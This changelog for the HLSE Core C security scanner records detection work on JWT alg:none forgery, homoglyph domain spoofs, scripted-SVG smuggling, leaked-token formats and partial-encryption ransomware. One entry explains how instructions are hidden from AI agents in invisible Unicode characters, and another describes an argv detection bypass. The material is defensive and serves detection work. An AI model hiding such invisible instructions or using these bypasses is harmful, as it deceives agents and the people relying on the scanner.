# Changelog

All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Added
- **JWT algorithm inspection, including the `alg:none` signature bypass**
  (`hlse_util.c`, `hlse_secrets.c`). A JWT's header is base64url — encoded, not
  encrypted — so its algorithm is readable offline.
  - **`alg:none` was structurally invisible.** Such a token has an *empty*
    signature segment by construction, and the detector required
    `signature >= 20`, so it excluded exactly the most dangerous case: an
    unsigned token anyone can forge. This is the classic signature bypass and
    it still produced CVEs through Q1 2026 (CVE-2026-28802 Authlib,
    CVE-2026-23993 HarbourJwt). Now reported at 70 (BLOCK) as an attack
    artifact or misconfiguration — deliberately a *different* finding class
    from a leaked credential, with its own `HLSE-SECRET-JWT-ALG-NONE` routing
    id.
  - **Case-insensitive**, because libraries keep falling to `nOnE` / `NONE` /
    `None` variants; all four are covered by tests.
  - Ordinary signed tokens now **name their algorithm** (`alg hs256`), which is
    triage information for free.
  - New `hlse_base64url_decode()` (RFC 4648 §5, padding optional).
    +6 CLI-integration tests (p123).

- **AWS key findings now name the owning account, derived offline**
  (`hlse_util.c`, `hlse_secrets.c`). An AWS access key ID encodes the account
  number in the identifier itself: base32-decode the body, take the first 6
  bytes, mask `0x7FFFFFFFFF80`, shift right 7. Publicly documented (Tal Be'ery;
  WithSecure's bitwise analysis of AWS key identifiers) and implemented in
  several open-source extractors.
  - Turns *"a key leaked"* into *"**this account** is exposed"* — the fact
    whoever responds actually needs — with **no `sts:GetAccessKeyInfo` call**,
    which is the whole point for a scanner that must never touch the network.
    Comparable tools reach for a verification API here; the identifier already
    carries the answer.
  - Doubles as a **structural check**: a well-formed key ID is exactly 20
    characters with a valid base32 (A–Z2–7) body, so a random look-alike is
    rejected rather than annotated. The repo's own 21-character test fixture
    correctly fails it.
  - New `hlse_aws_account_from_key()`, validated against four reference
    vectors cross-checked against the published Python implementation.
    +5 util tests (52/52), +3 CLI-integration tests (p122).

- **Confusable coverage beyond the original 36 mappings** (`hlse_core.c`).
  `cp_fold()` hand-mapped ~36 code points; UTS #39's `confusables.txt` maps
  ~6,565. Spoofs built from unmapped families folded to `?`, missed the brand
  table entirely, and landed on the generic score-25 advisory — **below the
  default fail threshold of 60, so they never gated CI and never named the
  impersonated brand**. Measured before/after, all resolving to `paypal`:

  | Spoof | Before | After |
  |---|---|---|
  | Cherokee `ᏢᎪᎩᏢᎪᏞ.com` | ALERT 40, no brand | BLOCK 75, whole-script confusable |
  | Uppercase Cyrillic `РАУРАЛ.com` | ALERT 40, no brand | BLOCK 75, whole-script confusable |
  | Fullwidth `ｐａｙｐａｌ.com` | ALERT 40, no brand | BLOCK 75, confusable characters |

  - **Cherokee** (U+13A0–13F5) added to both `cp_fold()` and `cp_script()`.
    Chrome names Cherokee alongside Cyrillic and Greek as a whole-script-
    confusable script; its syllabary carries many Latin-capital look-alikes.
  - **Uppercase Cyrillic and Greek** added. The parser's `str_tolower()` only
    folds ASCII, so these reached `cp_fold()` un-lowercased and mapped to
    nothing. All new mappings return lowercase, matching the lowercase brand
    table. Only glyphs **visually identical** to their Latin counterpart are
    listed — near-misses (Б, Л, Ω, σ, γ, η) were deliberately excluded, because
    a wrong fold manufactures brand matches out of legitimate text. U+04C0
    palochka is the genuine uppercase `l` look-alike.
  - **Fullwidth (U+FF21–FF5A) and mathematical Latin (U+1D400–1D6A3)** fold as
    ranges. These are Script=Latin — compatibility variants, not a script mix —
    so they get a third, accurate label: *"Confusable characters … uses
    look-alike variant characters"*, distinct from both mixed- and whole-script.

### Fixed
- **Non-ASCII domains are no longer flagged merely for being non-ASCII.** The
  fallback advisory fired on *any* non-ASCII host, so `münchen.de` and `日本.jp`
  — ordinary internationalised domains — were reported suspicious. It now
  requires a character from a Latin-**confusable** script to actually be
  present: an accented Latin name or a wholly different script has nothing to
  be confused with. Browsers do not warn on these either. Reason text renamed
  to *"Latin-confusable script characters in domain"* to match what it means.
- **UTS #39: whole-script confusables are no longer mislabelled "mixed-script"**
  (`hlse_core.c`). Unicode Technical Standard #39 separates two classes that
  `detect_mixed_script()` collapsed into one: *mixed-script* (Latin alongside a
  confusable character, `pаypal` with one Cyrillic а) and *whole-script
  confusable* (every letter from a single non-Latin script, `раураӏ`, all
  Cyrillic). The second is the harder and more dangerous class precisely
  because the script-mixing tell is absent — browsers treat it separately —
  yet HLSE reported it as `Mixed-script homoglyph`, which was factually wrong:
  nothing was mixed.
  - Script classification now reuses the existing `cp_script()` helper that the
    Punycode detector already relied on, so both paths apply the same standard.
  - Analysis is **per-label**, the unit UTS #39 defines and the unit a registry
    issues. Judging the whole host would be meaningless: the ASCII `.com` marks
    every host as containing Latin, so the whole-script case could never fire.
  - **False-positive carve-out**: a single-script non-Latin label under a
    registry that legitimately serves that script (`.ru`, `.su`, `.ua`, `.gr`,
    `.am`, …) is ordinary internationalisation and no longer draws the generic
    advisory — mirroring the per-script TLD allow-lists Chrome and Firefox use
    before falling back to Punycode display. Mixed-script labels get no such
    pass, since no registry legitimately issues those.
  - Severity is unchanged in every attack case (brand spoofs still score 60 and
    gate non-zero); only the wording changes, plus one clearly-legitimate class
    stops being flagged. F1 stays 1.000 / 0.0% FP.
  +6 CLI-integration tests (p120).

### Added
- **Prompt-injection detection: invisible instruction carriers**
  (`hlse_text.c`). The repository description already advertised prompt-
  injection coverage; no such detector existed. An AI agent consuming a
  document reads code points, not rendered glyphs, and attackers exploit that
  gap by encoding instructions in characters that render as nothing. Unit 42
  documented this in the wild in March 2026 (ad-review evasion, system-prompt
  leakage on live platforms); prompt injection is OWASP's top LLM risk for
  2026.
  - **Unicode Tags block** (U+E0000–U+E007F) mirrors ASCII one-to-one, so a
    full English instruction encodes into it while rendering as nothing.
    Detected when tag characters exceed what legitimate RGI emoji tag
    sequences can account for (those are always introduced by U+1F3F4 and run
    at most six tag characters each). Scores 70 (BLOCK).
  - **Long zero-width runs** (U+200B/200C/200D/FEFF) used as a binary data
    channel. Keyed on *run length*, not presence, because ZWJ in emoji
    sequences and ZWNJ in Persian/Indic text are legitimate but sparse.
    Scores 40 (ALERT).
  - Runs on the raw input *before* the evasion-normalization pipeline, which
    deliberately strips these code points — normalizing first would erase the
    evidence.
  - Verified against the false-positive boundaries: ZWJ family emoji, Persian
    ZWNJ text, and all three UK subdivision flags together stay clean.
  - Applied by **`scan <dir>`** as well as `text`. The realistic path is an AI
    agent reading files out of a repository — CSA documented payloads planted
    in tool descriptions, skill files and MCP server configs — not a human
    pasting text into the CLI. Findings print with `file:line`, count toward
    `threats`, and drive the exit gate. +5 CLI-integration tests (p119).
  - **Structural only, and the blind spot now says so**: an injection written
    in ordinary visible prose is a semantic problem this does not solve, and a
    clean result is explicitly not clearance to feed untrusted content to an
    agent. +5 CLI-integration tests (p118).

- **Chi-square byte-distribution test to qualify the R2 entropy finding**
  (`hlse_util.c`, `hlse_protect.c`). Shannon entropy cannot separate
  *encrypted* from *compressed* data — both sit near 8 bits/byte — which is
  the dominant false-positive source in entropy-based ransomware detection.
  The existing magic-byte skip only covers formats with a recognisable header,
  so a headerless or unknown container still lands as "likely encrypted".
  Reproduced here: six raw-deflate files (no magic) scored entropy 7.910 vs
  7.958 for random bytes — indistinguishable — and R2 fired on the compressed
  set. Chi-square separated the same samples 546 vs 242 (uniform ~255).
  - New `hlse_chi_square_uniform()` (256 bins, df 255; returns -1 below 1280
    bytes where the statistic is not meaningful). +4 util tests (47/47).
  - **One-directional by design.** A clearly structured histogram is evidence
    of compression and is reported as such; a *uniform* histogram is NOT
    reported as evidence of encryption, because compressed data often looks
    uniform too. Measured on a single deflate stream, the statistic ran
    628 / 398 / 289 / 319 as the sample grew 2K -> 4K -> 8K -> whole file —
    non-monotonic, and overlapping the encrypted range at the 4 KB HLSE
    samples. This matches the literature (Davies et al.; and the Kent
    "Why Current Statistical Approaches to Ransomware Detection Fail"
    analysis), which reports high false-positive rates for every single
    statistic taken alone.
  - **Score-neutral**: it annotates an R2 finding that already fired and never
    raises or lowers the score, so a misread can neither manufacture nor
    suppress a ransomware verdict. F1 stays 1.000 / 0.0% FP.
  +3 CLI-integration tests (p117).

- **Offline checksum verification for GitHub-format tokens** (`hlse_util.c`,
  `hlse_secrets.c`). GitHub's token formats are `prefix_` + 30 chars of
  entropy + 6 chars of checksum, where the checksum is CRC-32 of the entropy
  encoded as 6 base62 digits (GitHub Engineering, *Behind GitHub's new
  authentication token formats*, 2021). That makes well-formedness checkable
  **without contacting GitHub**, which suits an offline-by-design scanner.
  - Previously a random 36-character string after `ghp_` was reported with
    `confidence: certain` — the shape matched, but nothing confirmed it was a
    real token. Findings now say whether the checksum actually verifies.
  - New `hlse_crc32()` (standard IEEE 802.3 / zlib, reflected 0xEDB88320) and
    `hlse_base62_6()` primitives, validated against the standard CRC-32 test
    vectors (`"123456789"` -> 0xCBF43926, empty -> 0). +4 util tests (43/43).
  - **A checksum mismatch never suppresses a finding.** The encoding is
    reconstructed from public documentation rather than validated against live
    credentials, so treating a mismatch as "not a secret" could silently drop a
    real leaked token — the one failure a secret scanner must not have. A
    mismatch reports with a caveat that the value may be redacted,
    illustrative, or mistyped. Scores are unchanged; F1 stays 1.000 / 0.0% FP.
  - `hlse_secrets.c` now depends on `hlse_util.c`; the standalone
    `secrets_tests` and `fuzz_secrets` Makefile targets were updated to link it
    (they compiled the module in isolation and would otherwise fail to link).
  +4 CLI-integration tests (p116).

- **Slopsquat honesty for unverifiable package names** (`hlse_supply.c`,
  `hlse_core.c`). HLSE's package check is Damerau-Levenshtein distance<=2
  against a curated list, so a *wholly invented* name is invisible to it by
  construction — and it previously reported a bare `OK`, indistinguishable
  from a genuinely recognised package.
  Grounded in the USENIX Security 2025 analysis of LLM package hallucinations
  (Spracklen et al.; 576k samples across 16 models), which measured ~19.7% of
  LLM-recommended packages as non-existent and found only ~13% of those were
  off-by-one typos while roughly half were *highly dissimilar* to any real
  package — precisely the class an edit-distance check cannot see.
  - An exact registry match now emits an explicit recognition line
    (`Known package: 'requests' is a recognised pip package.`), mirroring the
    URL canonical-confirmation pattern, so `OK` is no longer ambiguous.
  - An unknown, non-near-miss name now selects a distinct `package_unverified`
    blind spot that states plainly that nothing was confirmed, explains why
    typo-distance cannot catch a fabricated name, and tells the user to verify
    age/owner/downloads on the registry if the name came from an AI assistant.
  - **Scoring is deliberately unchanged** — both cases remain score 0. A
    structural "looks hallucinated" heuristic would false-positive across the
    legitimate ecosystem (`flask-login`, `google-cloud-storage`, …), and the
    research is explicit that these names are not structurally distinguishable.
    F1 stays 1.000 / 0.0% FP. +5 CLI-integration tests (p115).

### Security
- **`--` end-of-options marker; global flags no longer parsed from operand
  positions** (`hlse_core.c`). All 11 global-flag loops scanned the whole of
  `argv` "anywhere", including OPERAND positions — which carry
  attacker-influenced scan data (a URL, message, package name, clipboard
  string). Two live consequences, both reproduced:
  - `hlse_core clipboard "--log-file" "/tmp/x"` created a file from scan data.
  - More seriously, the two-token argv shift meant **the real input was never
    analysed while the process still exited 0 ("safe") — a silent detection
    bypass.** In a pipeline scanning untrusted input, a crafted value disables
    the check while appearing to pass.
  Fix: an `argc_flags` boundary bounds every flag loop, and `--` sets it so
  everything after the marker is data. Backward compatible (flags before `--`
  behave exactly as before). Found by an adversarial review commissioned for a
  different feature; the review also recommended rejecting that feature, which
  was dropped. +4 CLI-integration tests (p114).

### Fixed
- **Terminal-injection hardening in protect reasons** (`hlse_protect.c`).
  Protection reasons embed attacker-controlled filenames (ESP `.efi` names,
  ransom-note names, mutated extensions), and the plain-text CLI prints them
  straight to a terminal. A file named with an embedded ESC byte could forge or
  hide output lines. `pv_add_reason()` now neutralises control bytes (`<0x20`,
  `0x7f`) once, at the single choke point every reason passes through, covering
  all plain-text print sites; the JSON path was already safe via `json_escape`.
  Flagged by the adversarial review of the ESP reentrancy work. +1 test
  (protect 22/22).

### Added
- **Alert sink (`hlse_alert.c`) + `--syslog` / `--log-file` — push-model
  finding delivery.** A one-shot scanner returns a verdict and exits; a
  resident/daemon (and any operator who wants findings recorded) needs verdicts
  PUSHED to a durable channel. New dependency-free module writes one JSON object
  per finding to syslog (`LOG_AUTHPRIV`) and/or an append-only `0600` JSONL log.
  This is a Phase-0 foundation for the planned `hlsed` daemon, but is immediately
  useful from the CLI.
  - Reviewed adversarially before implementation; the review caught and this
    commit fixes: a stack buffer overflow in the line builder (length is now a
    clamped `size_t`, every append bounded — no unchecked `snprintf`); an
    unchecked `fchmod` that could silently defeat the `0600` confidentiality
    guarantee (now a hard error); and EINTR/partial-write handling so each
    record is one intact line.
  - Wired into **every** scan type: the default url/text auto-detect dispatch
    (from the `ScanResult`, covering all three output branches uniformly) and
    the `protect`, `file`, `secret`, `paste`, `network`, `email`, `clipboard`,
    and `package` subcommands — so `--syslog`/`--log-file` capture findings from
    any invocation, not just url/text.
  - New shared `hlse_json_escape()` in `hlse_util.c` (consolidates the escaping
    logic instead of adding a third private copy); 3 unit tests (util 39/39).
  - `--log-file` opens `O_NOFOLLOW` (a fresh operator-owned append target has no
    legitimate reason to be a symlink) + `fstat`/`S_ISREG` check.
- **Daemon Phase-0 hygiene: fixed the only memory leak + one non-reentrant
  buffer.** `hlse_baseline_clear()` frees/resets the `--baseline` fingerprint
  set (previously never freed); ESP scanning now uses a per-call heap buffer
  reused via `read_file_head()` (removing the shared static scratch and closing
  an `lstat`->`open` TOCTOU window). `make asan-test` now actually exercises
  `--baseline` and `esp` (it never did), so LeakSanitizer verifies both.
- **Ransomware: R6 intermittent/partial-encryption detection**
  (`hlse_protect.c`). Closes the Tier-2 stretch item from the same July-2026
  research sweep (arXiv 2510.15133, BlackCat-style "dot/smart/head-only"
  modes) — modern ransomware evades whole-file/head-only entropy checks by
  encrypting only a slice of each file, leaving the header looking normal.
  - `read_file_segment()`: `pread` at an arbitrary offset (reuses the same
    symlink/FIFO/regular-file safety as `read_file_head`).
  - `is_low_entropy_ext()` + `LOW_ENTROPY_EXTS[]`: restricts the check to
    text/source/config extensions, which legitimately never contain a
    >7.5 bit/byte block — unlike documents/media, which are excluded to
    avoid the false positives whole-file entropy heuristics are known for.
  - R6 fires when >= 3 such files have a low-entropy header (<6.5, size
    >= 16 KiB) but a high-entropy (>7.5) middle or tail 4 KiB segment.
    Score 30, same tier as the existing R2 whole-file entropy spike.
  - 2 new protect tests (intermittent-encryption fires; genuinely low-entropy
    text directory does not) — protect suite now 21/21.
  - Verified: 0 warnings (CLI+lib strict), F1 = 1.000 on the in-distribution
    corpus (no new false positives), ASan/UBSan clean, full `make test` at
    the same 714 passed / 14 pre-existing unrelated failures as baseline.
- **Detection: 2026 threat-research round (SVG smuggling + 2026 secret
  formats).** Grounded in a July-2026 literature/threat-intel sweep
  cross-checked against the existing engine so only genuine gaps were closed
  (design contract kept: dependency-free C, zero network, no ML).
  - **Scripted-SVG smuggling (`F5`)** — `hlse_check_file` now flags an SVG
    whose first 4 KB carries executable script (`<script>`, an inline
    `onload`/`onerror`/`onclick`/`onmouseover` handler, `<foreignObject>`, a
    `javascript:` URI, or a `;base64,` payload). SVG-in-email smuggling was
    2026's fastest-growing file-delivery vector (MITRE ATT&CK T1027.017,
    Securelist), and `.svg` was previously *excluded* from masquerade
    scoring; `F5` is extension-independent because a scripted SVG is itself
    the vehicle, and also matches XML-declared SVGs (`<?xml …?><svg>`) that
    the HTML heuristic skips. Scored 55 (ALERT). 3 tests (script-tag,
    `onload=`, benign-chart-not-flagged); the `svg_has_script` scan is a
    bounded, NUL-terminated 4 KB pass.
  - **2026 secret token formats** — added the still-missing entries from the
    GitHub Mar-2026 secret-scanning batch: Supabase `sbp_`/`sb_secret_`,
    Figma `figd_`, PostHog `phx_`, LangSmith `lsv2_pt_`/`lsv2_sk_`. Each
    prefix is vendor-reserved (≈zero FP); intentionally-public keys
    (Supabase `sb_publishable_`, PostHog `phc_`) are omitted. Reuses the
    existing placeholder filter. 2 tests (6 formats detected; a 2026-prefix
    placeholder still excluded).
  - Verified: 0 warnings (CLI + library strict builds); secrets tests 66/66,
    file/audit tests 36/36; F1 = 1.000 on both in- and out-of-distribution
    corpora (no new false positives on benign SVGs/images); secrets fuzz
    100K + ASan clean; full `make test` shows the same 714 passed / 14
    pre-existing unrelated failures as before.
- **Web dashboard + HTTP API (`hlse-server`) — commercial-grade frontend to
  backend on top of the existing engine.** A small, dependency-free HTTP/1.1
  server (POSIX sockets + libc only; no third-party runtime) exposes the
  detection engine over JSON and serves a local, responsive, light/dark web
  dashboard for scanning URLs, messages, and code/config for leaked secrets.
  - Endpoints: `GET /api/v1/health`, `GET /api/v1/version`,
    `POST /api/v1/scan/{url,text,secrets,file}`. Verdicts come from the same
    `hlse_scan()` / `hlse_scan_secrets()` / `hlse_check_filename()` the CLI
    uses — no forked logic. `/scan/file` combines name-based masquerade
    detection with a leaked-secret content scan.
  - Access logging: each request is logged as `METHOD path -> status`.
  - End-to-end smoke test `tests/server_integration.sh` (14 checks, exposed as
    `make server-check`) plus the unit tests for the JSON parser/escaper.
  - Hardening: loopback bind by default, 64 KiB request-body cap, static
    assets via a fixed 3-route allowlist (path traversal structurally
    impossible), and CSP / `X-Content-Type-Options` / `X-Frame-Options` /
    `Referrer-Policy` headers on every response. GET/HEAD/POST only.
  - New files: `hlse_server.c`, `web/{index.html,app.js,style.css}`,
    `docs/API.md`, and `tests/hlse_server_tests.c` (11 unit tests for the
    untrusted JSON request parser and output escaper — the security-critical
    surface). Wired into `make` (`server` target, built by `all`, run by
    `test`) and `.gitignore`.
  - **Concurrency**: refactored to one detached pthread per connection
    (previously a single-threaded accept loop), capped at 64 simultaneous
    connections — a burst beyond the cap gets an immediate `503
    Service Unavailable` (`Retry-After: 1`) from the accept loop with no
    thread spawned, so it can't exhaust memory or file descriptors. Safe
    because every handler only reads `static const` engine tables
    (`hlse_scan()` / `hlse_scan_secrets()` / `hlse_check_filename()` are
    documented thread-safe) and all per-request state now lives in a
    stack-allocated `ConnCtx` — the prior per-request globals (log
    method/path/status, HEAD-suppress flag) were removed, eliminating the
    data races they would otherwise have under concurrent connections.
    Verified with a 30-way concurrent request burst (all succeed, ~70ms
    total) and a 70-socket saturation test confirming the `503` path
    triggers at the cap and recovers once slots free up.
  - **Packaging**: `make install`/`uninstall` now install `hlse-server`
    alongside the CLI. The installed binary is rebuilt with
    `HLSE_DEFAULT_WEBROOT` baked in as `$(PREFIX)/share/hlse/web` (the
    dashboard assets are installed there too), so `hlse-server` run from any
    directory after installation finds its assets — the plain in-repo
    `make server` build is unaffected and still defaults to `./web`.
    Added `hlse-server.1` man page (endpoints, concurrency model, examples),
    installed to `$(MANDIR)`. Verified round-trip in an isolated `PREFIX`:
    install → server run from an unrelated cwd serves the dashboard and API
    correctly → `uninstall` leaves the prefix empty.
  - Fixed the man page's `SEE ALSO` link, which pointed to
    `.../blob/main/docs/API.md` — a 404 until this branch merges, since that
    file only exists here. Replaced with a plain source-file reference plus
    the repository home page.
  - **Rate limiting**: per-source-IP fixed-window counter (300 requests per
    60s), checked in the accept loop before a thread is spawned or the
    detection engine runs. A source over the limit gets `429 Too Many
    Requests` with `Retry-After: 60`, logged as `RATE-LIMIT <ip> -> 429`.
    Defense-in-depth against a single runaway or abusive source; complements
    the existing `MAX_CONCURRENT` connection cap, which bounds simultaneous
    connections but not a sustained low-concurrency request flood from one
    IP. Implemented as a small mutex-guarded fixed-size table (256 buckets)
    to keep the logic auditable at this connection scale. 4 new unit tests
    (fresh-IP allowed, burst-at-limit allowed, over-limit rejected, per-IP
    isolation) — server unit tests now 15/15; verified live with a 305-request
    burst against a running server (299 succeed, 6 rejected with `429` +
    correct `Retry-After`, recovering after the window).
  - **`tests/hlse_server_fuzz.c`**: a 6th fuzz harness (`make fuzz`/
    `make fuzz-asan`), closing the one gap left by the round above — the
    server's JSON request parser (`json_get_string`) and output escaper
    (`json_escape_append`) are the only code in HLSE that consumes bytes
    directly from a network peer, so they now get the same fuzzing rigor as
    the URL/text/secrets/supply/file modules. Random bytes, adversarial
    JSON-like fragments (unbalanced braces, invalid `\u` escapes, truncated
    strings), and well-formed JSON generators; checks for crashes and an
    unterminated-output invariant. 100K plain + 10K ASan iterations, 0
    crashes, 0 invariant failures.

### Fixed (repo hygiene / documentation audit)
- Re-removed `files (1).zip` (a stale 1.1 MB v0.5.0 prebuilt-binary release
  artifact) and added `*.zip`/`*.tar.gz`/`*.tar.bz2`/`*.dSYM/` to
  `.gitignore`. This had been fixed once already in an earlier session, but
  that fix was on a commit discarded when the branch was re-synced to a
  parallel, more-advanced tip that never had it — recorded here so it
  doesn't get silently re-lost the same way again.
- `hlse.1` (the CLI man page)'s `.TH` version stamp was `"HLSE 0.9.15"` dated
  `2026-06-08` — many releases stale against the actual `HLSE_VERSION`
  (`1.0.113`). Bumped to match.
- Corrected internally-inconsistent test/fuzz counts: `README.md` claimed
  "460" structured tests and CONTRIBUTING.md claimed "320+" — neither traced
  to the actual current totals (9 unit suites summing to 327 cases + 29
  extended-corpus cases + 728 CLI-integration assertions = 1084+). Also
  fixed the fuzz-harness count (both docs said 4-5; actual is 6 after this
  round's addition) and added the missing `server`/`url` mentions to
  CONTRIBUTING's axis and gate tables.
- `Makefile`'s `clean` target was missing `$(FUZZ_URL)`/`$(FUZZ_URL_ASAN)`
  (pre-existing gap, found while wiring in the new server fuzz targets) —
  added alongside the new `$(FUZZ_SERVER)`/`$(FUZZ_SERVER_ASAN)`.

## [1.0.113] — 2026-07-04

### Changed
- **Perspective 113 (roadmap P2-12 + E-2): release-engineering maturity —
  real `release.yml` with checksums/SBOM/version-gating, and the
  donation-address cleanup a commercial-gap procurement review flagged.**

  **E-2 (donation address)**: an unexplained cryptocurrency address embedded
  in a security tool's compiled binary and every source file's header
  comment is, in a procurement/supply-chain review, indistinguishable from
  a compromise indicator — worse, the README labeled it "Cryptographic
  identity hash for maintainer verification," which is not an accurate
  description of what a Bitcoin address is or does (there is no signature
  scheme tying it to commits or releases). Fixed:
  - Removed `Identity: bitcoin:...` from `--version` output and from the
    header comments of all 6 source files that carried it (one also
    referenced a `MAINTAINER.md` that has never existed in this repo).
  - Added `.github/FUNDING.yml` — the standard, GitHub-recognized location
    for a project's donation address — and replaced the README's
    "Identity anchor" section with an accurate "Support the project" one.
  - `SECURITY.md` went further than README: it claimed security advisories
    are "signed against" the address and told users to distrust anything
    that isn't — an unverifiable claim, since no signing or verification
    tooling exists anywhere in this repo. Replaced with a plain statement
    that advisories are published only through GitHub's official channels.
    Its "Supported versions" table was also still listing pre-1.0 `0.6.x`/
    `0.7.x` ranges with nothing to do with the current `1.0.x` line; fixed
    to describe the actual (single-latest-version) support policy.
  - `CONTRIBUTING.md` directly *contradicted* the FUNDING.yml fix, stating
    "This is a cryptographic identity hash, not a donation address" — one
    more sign this narrative was never backed by an actual mechanism.
    Replaced with a plain pointer to `FUNDING.yml`.

  **P2-12 (release engineering)**: `release.yml` did not exist at all. Added
  a tag-triggered (`v[0-9]+.[0-9]+.[0-9]+`) workflow that:
  - Verifies the git tag matches the compiled-in `HLSE_VERSION` before doing
    anything else — a release is never published under a mismatched version.
  - Builds and gates on `make test` + `make check-warnings` + F1=1.000 on
    the corpus benchmark — the same bar every commit meets, not a shortcut.
  - Stages the CLI binary, static binary, shared library, public headers,
    man page, and JSON schemas; generates a `SHA256SUMS` checksum file and a
    minimal hand-written CycloneDX 1.5 SBOM (accurate by construction — HLSE
    has zero third-party dependencies beyond the system libc/libm).
  - Publishes a GitHub Release with these artifacts attached.

  Caught and fixed during implementation: the first checksum-generation
  draft (`find . -type f | ... | xargs sha256sum > SHA256SUMS`) hashed its
  own output file — the shell creates/truncates the redirect target *before*
  the pipeline runs, so `find` saw and hashed the empty `SHA256SUMS`,
  producing a checksum that was wrong the instant real content was written.
  Fixed with `find . -type f -not -name SHA256SUMS`; verified locally with a
  full `sha256sum -c` pass.

  Pure metadata/docs/CI change — no detection logic, score, or threshold
  touched (F1=1.000 preserved).

  - **Tests**: 9 new CLI integration tests — `--version` no longer leaks the
    address, no source file references it, `FUNDING.yml` carries it
    instead, `release.yml` exists/validates/gates correctly, the
    unverifiable "signed against" claim and stale version table are gone
    from `SECURITY.md`/`CONTRIBUTING.md`, and an F1-invariant check
    (728 total).

  **Known limitation**: `.github/workflows/release.yml` (and the
  pre-existing `ci.yml`/`codeql.yml`, which were present in this working
  tree but had never actually reached a remote branch) could not be pushed
  in this session — the CI bot's GitHub App token lacks the `workflows`
  permission scope GitHub requires to create or update files under
  `.github/workflows/`. The files exist on disk and pass all local tests
  above, but a repository maintainer with the right token/permissions
  needs to add them directly (e.g. via the GitHub web UI, or a token with
  the `workflows` scope) before the CI/release automation they describe
  actually runs.

## [1.0.112] — 2026-07-02

### Added
- **Perspective 112 (roadmap P1-6): `--patterns <file>` gains a `BRAND`
  directive — protect an organization's own name and executives from BEC/
  CEO-fraud impersonation without a rebuild.**

  The commercial-gap audit noted the built-in email display-name-vs-domain
  mismatch check (E1) only knows major consumer brands (Microsoft, PayPal,
  ...) — an organization could never protect its own name or executives from
  impersonation without recompiling. Extends the `--patterns` config format
  (introduced in P0-3 for custom secret patterns) with a second directive:
  ```
  BRAND <name> <owned_domain1>[,<owned_domain2>...]
  ```
  Registered via a new `hlse_register_custom_brand()` API in
  `hlse_secrets.h`/`.c`, checked by the *exact same* E1 logic (score +45,
  identical reason format) as the built-in brand table: if `<name>` appears
  in a From display name but the sending domain matches none of the
  registered owned domains, it fires — e.g. `BRAND acmecorp
  acmecorp.com,acme-corp.com` flags "Acme Corp Finance" emailing from an
  attacker's domain but not from either registered domain.

  Fixed during implementation: the initial parser read `<name>` with a
  single `%s` token, so it silently truncated at the first space — but real
  organization names commonly contain spaces ("Acme Corp", not "AcmeCorp").
  Rewrote the line parser to split from the end of the line (the domain
  list is always the last whitespace-delimited token, comma-separated with
  no internal spaces), so `<name>` can itself contain spaces, matching how
  the built-in table already handles multi-word entries ("office 365",
  "human resources") via the same `contains_word()` matcher.

  Purely additive — no built-in detection logic, score, or threshold
  touched. `--benchmark` never registers custom brands, so F1=1.000 is
  unaffected by construction.

  - **Docs**: `--help`, `hlse.1`, and `examples/custom-patterns.example`
    document the `BRAND` directive.
  - **Tests**: 12 new CLI integration tests — detection on/off without the
    flag, owned-domain (primary and alternate) suppression, CLI plaintext,
    malformed-line resilience, an unrelated-email no-op check, a built-in-
    brand F1-invariant check, and the multi-word-name parsing fix
    (719 total).

## [1.0.111] — 2026-07-02

### Added
- **Perspective 111 (roadmap P0-2, the last remaining P0): `scan <dir>
  --git-history` scans every commit ever made to a repository, not just the
  working tree.**

  The commercial-gap audit identified this as the primary use case for
  commercial secret scanners (gitleaks/trufflehog) that HLSE lacked
  entirely: a credential that was committed and later deleted (`git rm`) is
  still readable by anyone who clones the repository, but a working-tree-
  only scan never sees it. Verified end-to-end: a repo where a secret was
  added in one commit and removed in the next scores clean under plain
  `scan .` (0 threats) but is correctly flagged under `scan . --git-history`
  (ISOLATE, the original commit and path identified).

  Implementation: streams `git log --all -p --no-color --full-history`
  through **one** subprocess for the entire history (not one per commit or
  blob — keeps it fast on large repos) and scans only added ('+') lines,
  the moment each credential entered history, using the exact same
  `hlse_scan_secrets()` used everywhere else. Spawned via `fork()` +
  `execlp()`, never `popen()`/`system()`: the directory path is passed as a
  discrete argv element to `git`, so it is never interpreted by a shell and
  no path can inject a command. `git log` performs no network I/O (only
  `fetch`/`pull`/`clone` do), so this does not affect HLSE's zero-network-
  calls guarantee — verified by the existing CI privacy tripwire, which
  traces socket-family syscalls, not process spawns.

  Fully integrated with the existing scan infrastructure: `--json`, `--sarif`,
  `--baseline`, `--fingerprints`, and inline `hlse:allow` all work identically
  to a normal `scan`. A non-git directory is a usage error (exit 2) rather
  than a misleading "0 commits, clean" result; an empty-but-valid repo
  correctly distinguishes as clean (exit 0).

  Scoped to secrets (the dominant real-world case for history scanning, and
  what gitleaks/trufflehog both focus on); file-masquerade and embedded-URL
  checks remain working-tree-only for now.

  No detection logic, score, or threshold touched — F1=1.000 preserved.

  - **Docs**: `docs/SIEM_INTEGRATION.md` §5b, `--help`, and `hlse.1` document
    the new flag.
  - **Tests**: 13 new CLI integration tests using a real, disposable git
    repo — working-tree-clean-but-history-dirty verification, JSON/SARIF/
    fingerprint/baseline coverage, non-git and empty-repo edge cases, and an
    F1-invariant check (707 total).

## [1.0.110] — 2026-07-02

### Added
- **Perspective 110 (roadmap P0-3): `--patterns <file>` registers custom
  organization-specific secret patterns without a rebuild.**

  The commercial-gap audit (vs gitleaks.toml / detect-secrets plugins /
  GitGuardian custom detectors) found every credential pattern was compiled
  into a fixed C table — an organization's internal token formats (internal
  PKI, home-grown API keys, legacy deploy tokens) could never be taught to
  HLSE without recompiling from source, which is incompatible with a binary
  distribution model. `--patterns <file>` closes this: a small, non-regex
  config format registers additional prefix + charset + length patterns at
  runtime, checked by `hlse_scan_secrets()` using the *exact same* matching
  and placeholder/example-value suppression logic as the built-in table.

  File format (one directive per line; `#` comments and blanks ignored):
  ```
  SECRET <prefix> <min_suffix> <charset> <score> <label...>
  ```
  `charset` is one of `alnum | alnum_dash | hex | alpha | digit`; `label` is
  free text to end of line. A malformed line is skipped with a stderr
  warning (the rest of the file still loads); an unreadable file is a usage
  error (exit 2). Applies globally — `secret`, `scan`, and every other
  subcommand that scans text honor `--patterns` once loaded.

  New public library API in `hlse_secrets.h`:
  `hlse_register_custom_secret_pattern()`, `hlse_clear_custom_secret_patterns()`,
  `hlse_custom_secret_pattern_count()`, and the `HlseCharset` enum — usable
  directly by `libhlse.so` consumers, not just the CLI.

  Purely additive — no built-in detection logic, score, or threshold
  touched. `--benchmark` never passes `--patterns`, so F1=1.000 is
  unaffected by construction, not just by testing. A custom finding's
